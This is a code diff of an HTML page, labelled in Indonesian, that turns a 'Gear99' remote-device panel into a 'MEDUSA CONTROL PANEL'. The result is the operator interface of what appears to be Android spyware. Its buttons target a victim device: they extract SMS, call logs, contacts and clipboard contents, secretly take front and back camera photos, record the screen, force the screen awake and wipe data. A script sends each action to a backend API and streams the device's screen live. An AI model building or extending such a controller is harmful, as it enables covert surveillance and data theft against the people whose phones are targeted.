@@ -1,126 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Gear99 - Dual Active Operator</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEDUSA CONTROL PANEL // INSTANT ENGINE</title>
+    <link href="https://jsdelivr.net" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; }
-        body { 
-            background-color: #0b0c10; 
-            color: #c5c6c7; 
-            font-family: 'Courier New', monospace; 
-            margin: 0; padding: 0;
-            display: flex; height: 100vh; overflow: hidden;
-        }
-
-        /* KOLOM KIRI: MONITOR SIMULATOR */
-        .kolom-kiri {
-            width: 50%;
-            background-color: #000;
-            border-right: 3px solid #45f3ff;
-            display: flex; flex-direction: column;
-            position: relative;
-        }
-        .header-monitor {
-            padding: 15px; background-color: #0b0c10;
-            color: #45f3ff; font-weight: bold;
-            border-bottom: 1px solid #45f3ff;
-            text-shadow: 0 0 5px #45f3ff;
-        }
-        .iframe-container {
-            flex: 1; width: 100%; height: 100%; border: none; background-color: #000;
-        }
-
-        /* KOLOM KANAN: PANEL AKTIVITAS */
-        .kolom-kanan {
-            width: 50%; display: flex; flex-direction: column;
-            background-color: #1f2833; height: 100vh;
-        }
-        .panel-header {
-            padding: 20px; border-bottom: 2px solid #45f3ff; background-color: #0b0c10;
-        }
-        .panel-header h2 { margin: 0; color: #45f3ff; font-size: 20px; }
-        .panel-konten { padding: 20px; flex: 1; overflow-y: auto; }
-        .section-title {
-            color: #66fcf1; font-size: 14px; text-transform: uppercase;
-            margin-bottom: 10px; letter-spacing: 1px;
-            border-bottom: 1px dashed #66fcf1; padding-bottom: 5px;
-        }
-        .grid-tombol {
-            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 25px;
-        }
-        .btn-opsi {
-            background-color: #0b0c10; color: #45f3ff; border: 1px solid #45f3ff;
-            padding: 12px; font-family: inherit; font-weight: bold;
-            cursor: pointer; border-radius: 4px; text-align: center;
-        }
-        .btn-opsi:hover {
-            background-color: #45f3ff; color: #0b0c10; box-shadow: 0 0 10px #45f3ff;
-        }
-        .konsol-log {
-            background-color: #000; border: 1px solid #66fcf1; border-radius: 4px;
-            padding: 15px; height: 200px; overflow-y: auto;
-            font-size: 13px; color: #45f3ff; line-height: 1.6;
-        }
+        html, body, .wrapper { height: 100vh; overflow: hidden; margin: 0; padding: 0; background-color: #050505; }
+        body { color: #00FF00; font-family: 'Fira Code', monospace; font-size: 11px; }
+        .wrapper { display: flex; width: 100%; height: 100vh; }
+        .sidebar { width: 260px; background-color: #0a0a0a; border-right: 1px solid #222; padding: 15px; display: flex; flex-direction: column; height: 100%; justify-content: space-between; }
+        .system-title { font-weight: 600; letter-spacing: 1px; color: #FF0000; text-shadow: 0 0 8px rgba(255,0,0,0.3); font-size: 13px; margin-bottom: 15px; }
+        .device-panel { border: 1px solid #333; padding: 8px; border-radius: 4px; background: #0d0d0d; margin-bottom: 12px; }
+        .sidebar-btn { background-color: transparent; color: #aaa; border: 1px solid #232323; border-radius: 4px; padding: 6px; font-weight: 600; font-size: 10px; transition: all 0.2s; width: 100%; margin-bottom: 5px; text-transform: uppercase; }
+        .sidebar-btn:hover { border-color: #FF0000; color: #fff; background: rgba(139,0,0,0.1); }
+        .main-panel { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 10px; height: 100%; }
+        .panel-header { border-bottom: 1px solid #222; padding-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .grid-btn { background: #0d0d0d; color: #00FF00; border: 1px solid #222; border-radius: 4px; padding: 8px 10px; text-align: left; transition: all 0.15s; font-size: 11px; display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 6px; }
+        .grid-btn:hover { border-color: #00FF00; background: rgba(0,255,0,0.05); }
+        .bottom-row { display: flex; gap: 15px; height: 180px; min-height: 180px; }
+        .console-card { background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .console-header { background: #0d0d0d; border-bottom: 1px solid #222; padding: 4px 10px; font-size: 9px; color: #666; font-weight: 600; }
+        .log-textbox { background-color: #050505; color: #00FF00; overflow-y: auto; padding: 8px; font-size: 11px; line-height: 1.4; flex: 1; margin: 0; list-style: none; }
+        .stream-card { width: 240px; background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; display: flex; flex-direction: column; overflow: hidden; }
+        .stream-box { background: #000; flex: 1; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .stream-view { width: 100%; height: 100%; object-fit: contain; border: none; }
     </style>
 </head>
 <body>
-
-    <!-- ================= KOLOM KIRI: ANDROID INTERACTIVE LINK ================= -->
-    <div class="kolom-kiri">
-        <div class="header-monitor">📱 DOCKER ANDROID INTERACTIVE LINK (SINKRONISASI AKTIF)</div>
-        <!-- JALUR KONEKSI LANGSUNG KE PORT VNC DOCKER VPS VIA IP PUBLIK -->
-        <iframe class="iframe-container" src="http://45.66.153.149:6080/vnc.html?autoconnect=true&resize=scale" title="Android Controller"></iframe>
-    </div>
-
-    <!-- ================= KOLOM KANAN: PANEL UTENSIL ================= -->
-    <div class="kolom-kanan">
-        <div class="panel-header">
-            <h2>[ GEAR99 MANAGEMENT CORE ]</h2>
+    <div class="wrapper">
+        <!-- SIDEBAR UTAMA: KONTROL PERANGKAT -->
+        <div class="sidebar">
+            <div>
+                <div class="system-title">// MEDUSA ENGINE v4.0</div>
+                <div class="device-panel">
+                    <div style="color: #666; font-size: 9px; margin-bottom: 4px;">TARGET DEVICE INFRASTRUCTURE</div>
+                    <div id="device-spec-info" style="color: #fff; line-height: 1.3;">MENUNGGU KONEKSI NODE...</div>
+                </div>
+                <button class="btn sidebar-btn text-danger" onclick="sendAction('wipe-data')">⚠️ Wipe Device Data</button>
+                <button class="btn sidebar-btn text-warning" onclick="sendAction('reboot')">🔄 Reboot System</button>
+                <button class="btn sidebar-btn text-warning" onclick="sendAction('power-off')">🔌 Shutdown Engine</button>
+            </div>
+            <div>
+                <a href="/logout" class="btn sidebar-btn text-center text-white bg-danger border-0">DISCONNECT SESSION</a>
+            </div>
         </div>
-        
-        <div class="panel-konten">
-            <div class="section-title">Kontrol Sesi Kloning Perangkat</div>
-            <div class="grid-tombol">
-                <button class="btn-opsi" onclick="kirimAksi('unlock_screen')">🔓 UNLOCK SCREEN REMOTE</button>
-                <button class="btn-opsi" onclick="kirimAksi('sync_apps')">🔄 SINKRONISASI APLIKASI</button>
-                <button class="btn-opsi" onclick="kirimAksi('force_keep_alive')">🔋 ATUR TETAP MENYALA</button>
-                <button class="btn-opsi" onclick="kirimAksi('ping_device')">⚡ CEK STATUS JALUR</button>
+
+        <!-- MAIN PANEL: TOMBOL AKSI UTOMASI -->
+        <div class="main-panel">
+            <div class="panel-header">
+                <span style="font-weight:600; font-size:12px;">AUTOMATION CONTROL INJECTOR</span>
+                <span style="color:#666;">STATUS: <span style="color:#00FF00; text-shadow:0 0 4px #00FF00;">ONLINE</span></span>
             </div>
 
-            <div class="section-title">Riwayat Log Sinkronisasi Dua Arah</div>
-            <div id="output-log" class="konsol-log">
-                [SYSTEM] Jalur interkoneksi dua arah diaktifkan...<br>
-                [SYSTEM] Menunggu sinkronisasi ID akun eksternal.<br>
+            <!-- TABEL AKSI GRID -->
+            <div style="flex: 1; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 15px; border-radius: 4px;">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div style="color:#666; font-weight:600; margin-bottom:8px; border-bottom:1px solid #222; padding-bottom:3px;">INTEL DATA DISCOVERY</div>
+                        <button class="grid-btn" onclick="sendAction('sedot-sms')">Ekstraksi Kotak Masuk SMS</button>
+                        <button class="grid-btn" onclick="sendAction('sedot-calls')">Unduh Riwayat Panggilan</button>
+                        <button class="grid-btn" onclick="sendAction('sedot-kontak')">Kloning Daftar Kontak</button>
+                        <button class="grid-btn" onclick="sendAction('daftar-apps')">Daftar Aplikasi Terpasang</button>
+                        <button class="grid-btn" onclick="sendAction('curi-clipboard')">Intip Papan Klip (Clipboard)</button>
+                        <button class="grid-btn" onclick="sendAction('info-baterai')">Diagnostik Daya & Baterai</button>
+                    </div>
+                    <div class="col-md-4">
+                        <div style="color:#666; font-weight:600; margin-bottom:8px; border-bottom:1px solid #222; padding-bottom:3px;">SYSTEM MANIPULATION</div>
+                        <button class="grid-btn" onclick="sendAction('layar-nyala')">Paksa Bangunkan Layar</button>
+                        <button class="grid-btn" onclick="sendAction('kirim-toast')">Kirim Notifikasi Toast</button>
+                        <button class="grid-btn" onclick="sendAction('getar-hp')">Picu Getaran Perangkat (5s)</button>
+                        <button class="grid-btn" onclick="sendAction('mainkan-alarm')">Nyalakan Sirine Alarm</button>
+                        <button class="grid-btn" onclick="sendAction('stop-suara')">Hentikan Semua Audio</button>
+                    </div>
+                    <div class="col-md-4">
+                        <div style="color:#666; font-weight:600; margin-bottom:8px; border-bottom:1px solid #222; padding-bottom:3px;">MEDIA & CAPTURE</div>
+                        <button class="grid-btn" onclick="sendAction('foto-depan')">Ambil Foto Kamera Depan</button>
+                        <button class="grid-btn" onclick="sendAction('foto-belakang')">Ambil Foto Kamera Belakang</button>
+                        <button class="grid-btn" onclick="sendAction('screenshot')">Tangkap Cuplikan Layar (SCR)</button>
+                        <button class="grid-btn" onclick="sendAction('screenrecord')">Rekam Layar internal (15s)</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- KONSOL TERMINAL & LIVE STREAM FEED -->
+            <div class="bottom-row">
+                <div class="console-card">
+                    <div class="console-header">LIVE TELEMETRY HARDWARE MONITOR LOG</div>
+                    <ul id="log-list" class="log-textbox">
+                        <li>[SYSTEM] Central proxy automation secure channel online.</li>
+                    </ul>
+                </div>
+                <div class="stream-card">
+                    <div class="console-header">LIVE SCREENCAST STREAM</div>
+                    <div class="stream-box">
+                        <img id="screencast-feed" class="stream-view" src="/api/get-latest-frame" alt="[ NO LIVE FEED ]">
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        function kirimAksi(perintah) {
-            fetch('/send_command', {
+        function sendAction(actionName) {
+            fetch('/api/execute-action', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ command: perintah })
-            }).then(() => {
-                let logBox = document.getElementById('output-log');
-                logBox.innerHTML += `[${new Date().toLocaleTimeString()}] Perintah [${perintah.toUpperCase()}] dikirim ke sistem clone...<br>`;
-                logBox.scrollTop = logBox.scrollHeight;
+                body: JSON.stringify({ action: actionName })
             });
+            let li = document.createElement('li');
+            li.innerText = "[" + new Date().toLocaleTimeString() + "] COMMAND INJECT -> Memicu Utilitas " + actionName.toUpperCase() + "...";
+            let box = document.getElementById('log-list');
+            box.appendChild(li);
+            box.scrollTop = box.scrollHeight;
         }
 
-        function muatLogSistem() {
-            fetch('/get_logs')
+        setInterval(() => {
+            document.getElementById('screencast-feed').src = '/api/get-latest-frame?' + Date.now();
+            fetch('/api/get-telemetry-log')
                 .then(res => res.json())
                 .then(data => {
-                    if(data.logs && data.logs.length > 0) {
-                        let logBox = document.getElementById('output-log');
-                        logBox.innerHTML = data.logs.join('<br>');
-                        logBox.scrollTop = logBox.scrollHeight;
+                    if (data.details) {
+                        document.getElementById('device-spec-info').innerText = data.details;
                     }
-                });
-        }
-        setInterval(muatLogSistem, 2000);
+                    if (data.logs && data.logs.length > 0) {
+                        let logBox = document.getElementById('log-list');
+                        logBox.innerHTML = "";
+                        data.logs.forEach(msg => {
+                            let li = document.createElement('li');
+                            li.innerText = msg;
+                            logBox.appendChild(li);
+                        });
+                    }
+                }).catch(() => {});
+        }, 1200);
     </script>
 </body>
 </html>
